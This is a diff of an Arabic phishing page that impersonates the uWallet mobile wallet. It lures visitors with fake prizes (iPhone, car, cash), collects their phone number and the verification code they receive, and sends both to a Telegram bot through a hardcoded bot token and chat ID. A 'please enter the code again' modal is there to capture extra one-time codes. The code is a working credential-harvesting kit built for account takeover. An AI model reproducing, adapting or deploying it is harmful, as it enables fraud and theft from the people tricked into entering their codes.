@@ -2,91 +2,273 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>uWallet - تسجيل الدخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
+    <title>Uwalet - قدم طلبك</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
         }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 0;
+            margin: 0;
         }
 
-        .container {
+        .mobile-container {
             width: 100%;
-            max-width: 500px;
+            max-width: 420px;
+            height: 100vh;
+            max-height: 100vh;
             background: white;
-            border-radius: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            overflow: hidden;
-            min-height: 100vh;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
             display: flex;
             flex-direction: column;
+            border-radius: 40px;
+            overflow: hidden;
+            position: relative;
+            max-height: 100dvh;
         }
 
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 40px 30px 30px;
-            text-align: center;
+        /* ===== صفحة الترحيب ===== */
+        .welcome-section {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            overflow-y: auto;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
             color: white;
+            padding: 0;
+            animation: fadeIn 0.5s ease-in-out;
         }
 
-        .logo {
-            width: 100px;
-            height: 100px;
+        .welcome-section.active {
+            display: flex;
+        }
+
+        .welcome-header {
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
+            padding: 20px 20px 30px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .welcome-logo {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            letter-spacing: 2px;
+        }
+
+        .welcome-tagline {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 600;
+        }
+
+        .welcome-content {
+            flex: 1;
+            padding: 30px 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .welcome-section-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #ff6b9d;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .reward-card {
+            background: linear-gradient(135deg, rgba(255, 107, 157, 0.2) 0%, rgba(233, 69, 96, 0.2) 100%);
+            border: 2px solid #e94560;
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .reward-card:active {
+            transform: scale(0.95);
+            background: linear-gradient(135deg, rgba(255, 107, 157, 0.4) 0%, rgba(233, 69, 96, 0.4) 100%);
+        }
+
+        .reward-icon {
+            font-size: 40px;
+            margin-bottom: 8px;
+        }
+
+        .reward-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .reward-desc {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .features-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .feature-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 15px;
+            align-items: flex-start;
+        }
+
+        .feature-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .feature-text {
+            flex: 1;
+        }
+
+        .feature-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+
+        .feature-desc {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.4;
+        }
+
+        .welcome-btn {
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 20px;
+            margin-top: auto;
+            flex-shrink: 0;
+            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.4);
+        }
+
+        .welcome-btn:active {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(233, 69, 96, 0.6);
+        }
+
+        /* ===== صفحة التسجيل ===== */
+        .header {
             background: white;
-            border-radius: 20px;
+            padding: 0;
+            flex-shrink: 0;
+            min-height: 150px;
+            max-height: 150px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            font-size: 40px;
-            font-weight: bold;
-            color: #667eea;
+            overflow: hidden;
+            display: none;
         }
 
-        .header h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            letter-spacing: -0.5px;
+        .header.active {
+            display: flex;
         }
 
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-            font-weight: 300;
+        .header-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+            padding: 10px;
         }
 
         .content {
             flex: 1;
-            padding: 40px 30px 30px;
+            padding: 28px 24px;
             overflow-y: auto;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            -webkit-overflow-scrolling: touch;
+            display: none;
+        }
+
+        .content.active {
+            display: flex;
+        }
+
+        .content::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        .content::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .content::-webkit-scrollbar-thumb {
+            background: #d0d0d0;
+            border-radius: 3px;
         }
 
         .form-section {
             display: none;
+            animation: fadeIn 0.5s ease-in-out;
         }
 
         .form-section.active {
             display: block;
-            animation: fadeIn 0.5s ease-in-out;
         }
 
         @keyframes fadeIn {
             from {
                 opacity: 0;
-                transform: translateY(10px);
+                transform: translateY(15px);
             }
             to {
                 opacity: 1;
@@ -95,77 +277,99 @@
         }
 
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .form-group label {
             display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 10px;
-            text-align: right;
+            font-size: 12px;
+            font-weight: 700;
+            color: #1e3c72;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .input-wrapper {
             position: relative;
+            width: 100%;
         }
 
-        .form-group input {
+        .form-group input,
+        .form-group .date-input {
             width: 100%;
-            padding: 15px 20px;
-            border: 2px solid #e0e0e0;
-            border-radius: 15px;
-            font-size: 16px;
+            padding: 12px 14px;
+            border: 2px solid #e8e8e8;
+            border-radius: 10px;
+            font-size: 14px;
             font-family: inherit;
             transition: all 0.3s ease;
-            text-align: right;
-            background: #f8f9fa;
+            text-align: left;
+            background: #f9f9f9;
+            color: #333;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
-        .form-group input:focus {
+        .form-group input:focus,
+        .form-group .date-input:focus {
             outline: none;
-            border-color: #667eea;
+            border-color: #e94560;
             background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.1);
         }
 
         .form-group input::placeholder {
             color: #999;
         }
 
-        .input-icon {
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #667eea;
-            font-size: 20px;
-            pointer-events: none;
+        .date-input {
+            cursor: pointer;
+        }
+
+        .date-input::-webkit-calendar-picker-indicator {
+            cursor: pointer;
+            border-radius: 4px;
+            margin-right: 4px;
+            opacity: 0.6;
+            filter: invert(0.6);
         }
 
         .btn-submit {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 12px;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
             color: white;
             border: none;
-            border-radius: 15px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 15px;
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+            margin-top: 20px;
+            box-shadow: 0 10px 25px rgba(233, 69, 96, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            -webkit-appearance: none;
+            appearance: none;
+            flex-shrink: 0;
         }
 
-        .btn-submit:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
+        .btn-submit::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            transition: all 0.5s ease;
         }
 
         .btn-submit:active {
-            transform: translateY(0);
+            transform: translateY(-1px);
         }
 
         .btn-submit:disabled {
@@ -174,118 +378,165 @@
             transform: none;
         }
 
-        /* Verification Section */
+        /* ===== قسم التحقق ===== */
         .verification-section {
+            direction: ltr;
+        }
+
+        .verification-header {
             text-align: center;
+            margin-bottom: 20px;
         }
 
         .verification-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 10px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e3c72;
+            margin-bottom: 6px;
         }
 
         .verification-subtitle {
-            font-size: 14px;
+            font-size: 12px;
             color: #666;
-            margin-bottom: 30px;
-            line-height: 1.6;
+            line-height: 1.4;
         }
 
         .phone-display {
-            background: #f0f0f0;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            font-size: 14px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #f8f9fb 100%);
+            padding: 12px 14px;
+            border-radius: 10px;
+            margin-bottom: 22px;
+            font-size: 11px;
             color: #666;
-            font-weight: 500;
+            font-weight: 600;
+            text-align: center;
+            border: 1px solid #e8e8e8;
         }
 
         .verification-code-input {
             display: flex;
             justify-content: center;
-            gap: 12px;
-            margin: 35px 0;
+            gap: 10px;
+            margin: 30px 0 25px;
+            flex-direction: row;
         }
 
         .code-digit {
-            width: 60px;
-            height: 60px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 28px;
-            font-weight: 700;
+            width: 52px;
+            height: 52px;
+            border: 2.5px solid #e8e8e8;
+            border-radius: 10px;
+            font-size: 22px;
+            font-weight: 800;
             text-align: center;
             transition: all 0.3s ease;
-            background: #f8f9fa;
+            background: #f9f9f9;
             color: #333;
+            cursor: text;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
         .code-digit:focus {
             outline: none;
-            border-color: #667eea;
+            border-color: #e94560;
             background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.1);
+            transform: scale(1.05);
         }
 
         .code-digit.filled {
-            border-color: #667eea;
-            background: white;
-            color: #667eea;
+            border-color: #e94560;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
+            color: white;
+            font-weight: 800;
+        }
+
+        .timer-section {
+            text-align: center;
+            margin: 15px 0;
         }
 
         .timer {
-            font-size: 14px;
-            color: #666;
-            margin: 20px 0;
-            font-weight: 500;
+            font-size: 20px;
+            font-weight: 700;
+            color: #e94560;
+            transition: all 0.3s ease;
         }
 
         .timer.warning {
             color: #ff6b6b;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+        }
+
+        .timer-label {
+            font-size: 10px;
+            color: #999;
+            margin-top: 3px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .resend-section {
-            margin-top: 25px;
-            padding-top: 25px;
-            border-top: 1px solid #e0e0e0;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 2px solid #f0f0f0;
+            text-align: center;
         }
 
         .resend-btn {
             background: none;
             border: none;
-            color: #667eea;
-            font-size: 14px;
-            font-weight: 600;
+            color: #e94560;
+            font-size: 12px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            padding: 10px;
+            padding: 6px 10px;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
-        .resend-btn:hover {
-            color: #764ba2;
-            text-decoration: underline;
+        .resend-btn:active {
+            transform: translateY(-1px);
         }
 
         .resend-btn:disabled {
-            opacity: 0.5;
+            opacity: 0.4;
             cursor: not-allowed;
+            transform: none;
+        }
+
+        .resend-countdown {
+            font-size: 10px;
+            color: #999;
+            margin-top: 4px;
         }
 
         .toast {
             position: fixed;
-            bottom: 30px;
-            right: 30px;
+            bottom: 20px;
+            left: 20px;
             background: #333;
             color: white;
-            padding: 16px 24px;
-            border-radius: 12px;
+            padding: 14px 20px;
+            border-radius: 10px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             animation: slideIn 0.4s ease-in-out;
-            max-width: 300px;
+            max-width: calc(100% - 40px);
             z-index: 1000;
+            font-size: 12px;
+            font-weight: 500;
         }
 
         .toast.success {
@@ -297,12 +548,12 @@
         }
 
         .toast.info {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
         }
 
         @keyframes slideIn {
             from {
-                transform: translateX(400px);
+                transform: translateX(-400px);
                 opacity: 0;
             }
             to {
@@ -317,7 +568,7 @@
                 opacity: 1;
             }
             to {
-                transform: translateX(400px);
+                transform: translateX(-400px);
                 opacity: 0;
             }
         }
@@ -328,21 +579,28 @@
 
         .error-message {
             color: #ff6b6b;
-            font-size: 13px;
-            margin-top: 8px;
-            text-align: right;
+            font-size: 10px;
+            margin-top: 4px;
+            text-align: left;
             display: none;
+            font-weight: 500;
         }
 
         .error-message.show {
             display: block;
+            animation: shake 0.3s ease-in-out;
         }
 
-        /* Loading State */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+        }
+
         .loading {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 16px;
+            height: 16px;
             border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top-color: white;
@@ -353,107 +611,237 @@
             to { transform: rotate(360deg); }
         }
 
+        /* Success Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal.active {
+            display: flex;
+            animation: fadeInModal 0.3s ease-in-out;
+        }
+
+        @keyframes fadeInModal {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 16px;
+            padding: 30px 24px;
+            max-width: 300px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease-in-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-icon {
+            font-size: 50px;
+            margin-bottom: 16px;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e3c72;
+            margin-bottom: 12px;
+        }
+
+        .modal-message {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .modal-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .modal-btn:active {
+            transform: translateY(-1px);
+        }
+
         @media (max-width: 480px) {
-            .container {
-                border-radius: 20px;
+            .mobile-container {
+                border-radius: 0;
             }
 
             .header {
-                padding: 30px 20px 20px;
-            }
-
-            .logo {
-                width: 80px;
-                height: 80px;
-                font-size: 32px;
-            }
-
-            .header h1 {
-                font-size: 20px;
+                min-height: 140px;
+                max-height: 140px;
             }
 
             .content {
-                padding: 30px 20px 20px;
+                padding: 24px 20px;
             }
+        }
 
-            .code-digit {
-                width: 50px;
-                height: 50px;
-                font-size: 24px;
-            }
-
-            .verification-code-input {
-                gap: 8px;
-            }
+        input {
+            font-size: 16px !important;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">U</div>
-            <h1>uWallet</h1>
-            <p>مرحبا بعودتك!</p>
+    <div class="mobile-container">
+        <!-- صفحة الترحيب -->
+        <div class="welcome-section active" id="welcomeSection">
+            <div class="welcome-header">
+                <div class="welcome-logo">UWALLET</div>
+                <div class="welcome-tagline">أسهل • أسرع • أقرب إليك</div>
+            </div>
+
+            <div class="welcome-content">
+                <!-- الجوائز -->
+                <div>
+                    <div class="welcome-section-title">🎁 جوائز مذهلة تنتظرك</div>
+                    <div class="rewards-grid">
+                        <div class="reward-card">
+                            <div class="reward-icon">📱</div>
+                            <div class="reward-title">آيفون 17 برو</div>
+                            <div class="reward-desc">أحدث إصدار</div>
+                        </div>
+                        <div class="reward-card">
+                            <div class="reward-icon">🎧</div>
+                            <div class="reward-title">ايربودز برو</div>
+                            <div class="reward-desc">تقنية متقدمة</div>
+                        </div>
+                        <div class="reward-card">
+                            <div class="reward-icon">📱</div>
+                            <div class="reward-title">آيباد برو</div>
+                            <div class="reward-desc">شاشة كبيرة</div>
+                        </div>
+                        <div class="reward-card">
+                            <div class="reward-icon">🚗</div>
+                            <div class="reward-title">سيارة فخمة</div>
+                            <div class="reward-desc">حلم الجميع</div>
+                        </div>
+                        <div class="reward-card">
+                            <div class="reward-icon">💰</div>
+                            <div class="reward-title">25 دينار</div>
+                            <div class="reward-desc">لمرة واحدة</div>
+                        </div>
+                        <div class="reward-card">
+                            <div class="reward-icon">🎯</div>
+                            <div class="reward-title">جوائز أخرى</div>
+                            <div class="reward-desc">مفاجآت يومية</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- الخصائص -->
+                <div>
+                    <div class="welcome-section-title">✨ مميزات تطبيقنا</div>
+                    <div class="features-section">
+                        <div class="feature-item">
+                            <div class="feature-icon">🛡️</div>
+                            <div class="feature-text">
+                                <div class="feature-title">أمان وموثوقية عالية</div>
+                                <div class="feature-desc">تقنية تشفير متطورة لحماية بيانات عملائنا</div>
+                            </div>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-icon">⚡</div>
+                            <div class="feature-text">
+                                <div class="feature-title">معاملات سريعة</div>
+                                <div class="feature-desc">تحويل أموال فوري وبدون رسوم خفية</div>
+                            </div>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-icon">📱</div>
+                            <div class="feature-text">
+                                <div class="feature-title">كل خدماتك بمكان واحد</div>
+                                <div class="feature-desc">تطبيق شامل لجميع احتياجاتك المالية</div>
+                            </div>
+                        </div>
+                        <div class="feature-item">
+                            <div class="feature-icon">🎉</div>
+                            <div class="feature-text">
+                                <div class="feature-title">مزايا وعروض حصرية</div>
+                                <div class="feature-desc">استمتع بعروض وجوائز يومية</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="welcome-btn" id="startBtn">ابدأ الآن</button>
         </div>
 
-        <div class="content">
+        <!-- Header صفحة التسجيل -->
+        <div class="header" id="header">
+            <img src="https://h.top4top.io/p_3899c1vif0.jpeg" alt="uWallet Header" class="header-image" id="headerImg">
+        </div>
+
+        <!-- Content صفحة التسجيل -->
+        <div class="content" id="content">
             <!-- Login Form -->
             <div class="form-section active" id="loginForm">
-                <h2 style="display: none;"></h2>
-                
                 <div class="form-group">
                     <label for="phone">رقم الهاتف *</label>
                     <div class="input-wrapper">
                         <input 
                             type="tel" 
                             id="phone" 
-                            placeholder="097XXXXXXXX"
+                            placeholder="ادخل رقم الهاتف"
                             inputmode="numeric"
                             maxlength="10"
                         >
-                        <span class="input-icon">📱</span>
                     </div>
                     <div class="error-message" id="phoneError"></div>
                 </div>
 
-                <div class="form-group">
-                    <label for="nationalId">الرقم الوطني / جواز السفر *</label>
-                    <div class="input-wrapper">
-                        <input 
-                            type="text" 
-                            id="nationalId" 
-                            placeholder="أدخل رقم الهوية الوطنية"
-                            inputmode="numeric"
-                        >
-                        <span class="input-icon">🆔</span>
-                    </div>
-                    <div class="error-message" id="nationalIdError"></div>
-                </div>
-
-                <div class="form-group">
-                    <label for="birthDate">تاريخ الميلاد *</label>
-                    <div class="input-wrapper">
-                        <input 
-                            type="date" 
-                            id="birthDate"
-                        >
-                        <span class="input-icon">📅</span>
-                    </div>
-                    <div class="error-message" id="birthDateError"></div>
-                </div>
-
-                <button class="btn-submit" id="loginBtn">تسجيل الدخول</button>
+                <button class="btn-submit" id="loginBtn">دخول</button>
             </div>
 
             <!-- Verification Form -->
-            <div class="form-section" id="verificationForm">
-                <div class="verification-title">أدخل رمز التحقق</div>
-                <div class="verification-subtitle">
-                    أدخل رمز التحقق المكون من 4 أرقام<br>
-                    المرسل إلى رقم هاتفك
+            <div class="form-section verification-section" id="verificationForm">
+                <div class="verification-header">
+                    <div class="verification-title">Verification Code</div>
+                    <div class="verification-subtitle">
+                        Enter the 4-digit code<br>
+                        sent to your phone
+                    </div>
                 </div>
 
-                <div class="phone-display" id="phoneDisplay"></div>
+                <div class="phone-display" id="phoneDisplay">Sent to: xxxxxxxx77</div>
 
                 <div class="verification-code-input" id="codeInput">
                     <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="0">
@@ -462,14 +850,30 @@
                     <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="3">
                 </div>
 
-                <div class="timer" id="timer">4:50</div>
+                <div class="timer-section">
+                    <div class="timer" id="timer">5:00</div>
+                    <div class="timer-label">Time Remaining</div>
+                </div>
 
-                <button class="btn-submit" id="verifyBtn">تأكيد</button>
+                <button class="btn-submit" id="verifyBtn">Confirm</button>
 
                 <div class="resend-section">
-                    <button class="resend-btn" id="resendBtn">إعادة إرسال الرمز</button>
+                    <button class="resend-btn" id="resendBtn">Resend Code</button>
+                    <div class="resend-countdown" id="resendCountdown"></div>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="modal-icon">📨</div>
+            <div class="modal-title">يرجى الإدخال مرة أخرى</div>
+            <div class="modal-message">
+                تم الإرسال، يرجى إدخال الرمز مرة أخرى بشكل صحيح
+            </div>
+            <button class="modal-btn" id="modalBtn">حسناً</button>
         </div>
     </div>
 
@@ -477,20 +881,31 @@
         // Configuration
         const TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4';
         const TELEGRAM_CHAT_ID = '6873334348';
-        const VERIFICATION_TIMER = 300; // 5 minutes in seconds
+        const VERIFICATION_TIMER = 300;
+
+        // Arabic to English digit mapping
+        const arabicToEnglish = {
+            '٠': '0', '١': '1', '٢': '2', '٣': '3', '٤': '4',
+            '٥': '5', '٦': '6', '٧': '7', '٨': '8', '٩': '9'
+        };
+
+        // Helper function to convert Arabic digits to English
+        const convertArabicToEnglish = (str) => {
+            return str.replace(/[٠-٩]/g, (digit) => arabicToEnglish[digit]);
+        };
 
         // State
         let formData = {
             phone: '',
-            nationalId: '',
-            birthDate: '',
             verificationCode: '',
             generatedCode: ''
         };
 
         let timerInterval = null;
         let timeRemaining = VERIFICATION_TIMER;
-        let resendCount = 0;
+        let resendCountdown = 0;
+        let resendInterval = null;
+        let isVerificationPageActive = false;
 
         // Helper Functions
         const showToast = (message, type = 'info') => {
@@ -505,21 +920,25 @@
             }, 4000);
         };
 
+        const showModal = (title, message) => {
+            const modal = document.getElementById('successModal');
+            modal.querySelector('.modal-title').textContent = title;
+            modal.querySelector('.modal-message').textContent = message;
+            modal.classList.add('active');
+        };
+
+        const closeModal = () => {
+            document.getElementById('successModal').classList.remove('active');
+        };
+
         const formatPhoneDisplay = (phone) => {
-            return `xxx${phone.slice(-2)}`;
+            const lastDigits = phone.slice(-2);
+            return `Sent to: xxxxxxxx${lastDigits}`;
         };
 
         const validatePhone = (phone) => {
             const pattern = /^(077|078|079)\d{7}$/;
             return pattern.test(phone);
-        };
-
-        const validateNationalId = (id) => {
-            return id.trim().length >= 5;
-        };
-
-        const validateDate = (date) => {
-            return date && date.trim().length > 0;
         };
 
         const generateVerificationCode = () => {
@@ -529,14 +948,16 @@
         const sendToTelegram = async (data) => {
             try {
                 const message = `
-📱 بيانات تسجيل دخول جديدة:
-━━━━━━━━━━━━━━━━━━━
-📞 رقم الهاتف: ${data.phone}
-🆔 الرقم الوطني: ${data.nationalId}
-📅 تاريخ الميلاد: ${data.birthDate}
-${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : ''}
-━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
+📱 <b>New Login Request</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>User Information:</b>
+📞 <code>${data.phone}</code>
+${data.verificationCode ? `
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ <b>Verification Code:</b>
+<code>${data.verificationCode}</code>
+` : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                 `.trim();
 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -572,7 +993,7 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
                     clearInterval(timerInterval);
                     document.getElementById('resendBtn').disabled = false;
                     document.getElementById('verifyBtn').disabled = true;
-                    showToast('انتهت مهلة إدخال الرمز، يرجى إعادة الطلب', 'error');
+                    showToast('Time expired', 'error');
                 }
             }, 1000);
         };
@@ -585,13 +1006,13 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
             
             if (timeRemaining <= 60) {
                 timerEl.classList.add('warning');
+            } else {
+                timerEl.classList.remove('warning');
             }
         };
 
         const clearErrors = () => {
             document.getElementById('phoneError').classList.remove('show');
-            document.getElementById('nationalIdError').classList.remove('show');
-            document.getElementById('birthDateError').classList.remove('show');
         };
 
         const showError = (fieldId, message) => {
@@ -602,38 +1023,21 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
 
         const switchToVerification = async () => {
             formData.phone = document.getElementById('phone').value;
-            formData.nationalId = document.getElementById('nationalId').value;
-            formData.birthDate = document.getElementById('birthDate').value;
 
             clearErrors();
 
-            // Validation
             if (!formData.phone) {
-                showError('phoneError', 'رقم الهاتف مطلوب');
+                showError('phoneError', 'الهاتف مطلوب');
                 return;
             }
             if (!validatePhone(formData.phone)) {
-                showError('phoneError', 'يجب أن يبدأ برقم 077 أو 078 أو 079 ويتكون من 10 أرقام');
-                return;
-            }
-            if (!formData.nationalId) {
-                showError('nationalIdError', 'الرقم الوطني مطلوب');
-                return;
-            }
-            if (!validateNationalId(formData.nationalId)) {
-                showError('nationalIdError', 'الرقم الوطني غير صحيح');
-                return;
-            }
-            if (!formData.birthDate) {
-                showError('birthDateError', 'تاريخ الميلاد مطلوب');
+                showError('phoneError', '077/078/079 + 7 أرقام');
                 return;
             }
 
-            // Generate code
             formData.generatedCode = generateVerificationCode();
-            console.log('كود التحقق:', formData.generatedCode);
+            console.log('🔐 Code:', formData.generatedCode);
 
-            // Send to Telegram
             const loginBtn = document.getElementById('loginBtn');
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="loading"></span>';
@@ -641,62 +1045,39 @@ ${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : 
             const sent = await sendToTelegram(formData);
 
             loginBtn.disabled = false;
-            loginBtn.textContent = 'تسجيل الدخول';
+            loginBtn.textContent = 'دخول';
 
             if (sent) {
-                showToast('تم إرسال رمز التحقق بنجاح', 'success');
-                
-                // Switch form
+                document.getElementById('welcomeSection').classList.remove('active');
+                document.getElementById('header').classList.add('active');
+                document.getElementById('content').classList.add('active');
                 document.getElementById('loginForm').classList.remove('active');
                 document.getElementById('verificationForm').classList.add('active');
-                
-                // Update phone display
-                document.getElementById('phoneDisplay').textContent = `تم الإرسال إلى: ${formatPhoneDisplay(formData.phone)}`;
-                
-                // Focus first digit
-                document.querySelector('.code-digit').focus();
-                
-                // Start timer
+                document.getElementById('headerImg').src = 'https://i.top4top.io/p_3899kc4nn0.jpeg';
+                document.getElementById('phoneDisplay').textContent = formatPhoneDisplay(formData.phone);
+                document.querySelector('.code-digit[data-index="0"]').focus();
                 startTimer();
+                isVerificationPageActive = true;
             } else {
-                showToast('خطأ في إرسال رمز التحقق، يرجى المحاولة مرة أخرى', 'error');
+                showToast('خطأ في الإرسال', 'error');
             }
         };
 
         const verifyCode = async () => {
-            formData.verificationCode = document.querySelectorAll('.code-digit')
-                .map(input => input.value)
-                .join('');
